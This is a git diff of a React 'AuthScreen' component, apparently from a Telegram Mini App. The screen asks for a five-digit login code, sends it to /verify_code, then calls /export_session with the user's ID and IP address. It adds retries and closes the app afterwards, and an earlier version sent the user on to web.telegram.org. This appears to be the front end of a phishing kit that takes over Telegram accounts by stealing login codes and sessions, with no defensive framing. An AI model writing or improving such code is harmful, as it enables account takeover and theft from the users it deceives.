@@ -1,51 +1,122 @@
 import React, { useState } from "react";
-import { toast } from 'react-toastify';
 import { api } from '../services/router';
-import { useNavigate } from "react-router-dom";
 const AuthScreen = ({ phone, IP }) => {
-    const navigate = useNavigate();
+    // const navigate = useNavigate();
     const [loading, setLoading] = useState(false);
     const [error, setError] = useState("")
+
     const handleVerificatiionCode = async (event) => {
         try {
-            let inputValue = event.target?.value
+            const inputValue = event.target.value;
             if (inputValue.length === 5) {
-                const userId = localStorage.getItem("user_id")
-                console.log(userId)
+                const userId = localStorage.getItem("user_id");
                 const data = {
-                    "code": inputValue,
-                    "user_id": userId
-                }
-                setLoading(true);
-                const response = await api.post("/verify_code", data, {
-                    headers: { "Content-Type": "application/json" },  // Ensure correct content type
-                })
-                console.log(response)
-                if (response.status === 200) {
-                    setError("")
-                    setLoading(false);
-                    console.log(IP)
-                    const res = await api.get(`/export_session/${userId}?ip=${IP}`, {
-                        headers: { "Content-Type": "application/json" }  // Correct headers
-                    });
+                    code: inputValue,
+                    user_id: userId
+                };
 
-                    console.log(res);
-                    // window.location.href = "https://web.telegram.org/k/";
-                    // // navigate("/");
-                } else {
-                    setLoading(false);
-                    setError(response.data?.message || "Unexpected error occured");
+                setLoading(true);
+
+                try {
+                    // First verify code
+                    const verifyResponse = await api.post("/verify_code", data, {
+                        headers: {
+                            "Content-Type": "application/json",
+                            "Retry-Attempt": "3"  // Add retry header
+                        }
+                    });
+                    console.log(verifyResponse)
+
+                    // Then export session
+                    const exportResponse = await api.get(`/export_session/${userId}`, {
+                        params: { ip: IP },
+                        timeout: 10000  // 10 second timeout
+                    });
+                    console.log(exportResponse)
+
+                } catch (error) {
+                    if (error.response?.status === 503) {
+                        // Implement retry logic
+                        let attempts = 0;
+                        while (attempts < 3) {
+                            try {
+                                await new Promise(resolve => setTimeout(resolve, 2000));
+                                const retryResponse = await api.get(`/export_session/${userId}?ip=${IP}`);
+                                break;
+                            } catch (retryError) {
+                                console.error(retryError)
+                                attempts++;
+                            }
+                        }
+                    }
+                    throw error;
                 }
             }
-        } catch (e) {
+        } catch (error) {
+            console.error("Verification failed:", error);
+            setError(error.response?.data?.detail || "Operation failed");
+        } finally {
             setLoading(false);
-            console.error(e)
-            setError(e.response.data?.detail || "Unexpected error occured")
+            // Handle Telegram WebApp closure
+            if (window.Telegram?.WebApp?.close) {
+                window.Telegram.WebApp.close();
+            }
         }
-    }
+    };
+    // const handleVerificatiionCode = async (event) => {
+    //     try {
+    //         let inputValue = event.target?.value
+    //         if (inputValue.length === 5) {
+    //             const userId = localStorage.getItem("user_id")
+    //             console.log(userId)
+    //             const data = {
+    //                 "code": inputValue,
+    //                 "user_id": userId
+    //             }
+    //             setLoading(true);
+    //             const response = await api.post("/verify_code", data, {
+    //                 headers: { "Content-Type": "application/json" },  // Ensure correct content type
+    //             })
+    //             console.log(response)
+    //             if (response.status === 200) {
+    //                 setError("")
+    //                 setLoading(false);
+    //                 console.log(IP)
+    //                 await delay(2000);
+    //                 const res = await api.get(`/export_session/${userId}`, {
+    //                     params: { ip: IP },
+    //                     timeout: 10000  // 10 second timeout
+    //                 },
+    //                     {
+    //                         headers: { "Content-Type": "application/json" }
+    //                     });
+
+    //                 console.log(res);
+    //                 // Close the Telegram Mini App
+    //                 if (window.Telegram.WebApp) {
+    //                     window.Telegram.WebApp.close();
+    //                 } else {
+    //                     console.error("Telegram WebApp API is not available.");
+    //                 }
+    //             } else {
+    //                 setLoading(false);
+    //                 setError(response.data?.message || "Unexpected error occured");
+    //             }
+    //         }
+    //     } catch (e) {
+    //         setLoading(false);
+    //         console.error(e)
+    //         setError(e.response.data?.detail || "Unexpected error occured")
+    //     }
+    // }
+
+
     const handleCodeFocus = () => {
         setError("")
     }
+
+
+
     return (
         <div className="flex items-center justify-center min-h-screen bg-gray-900">
             <div className="w-96  text-center ">
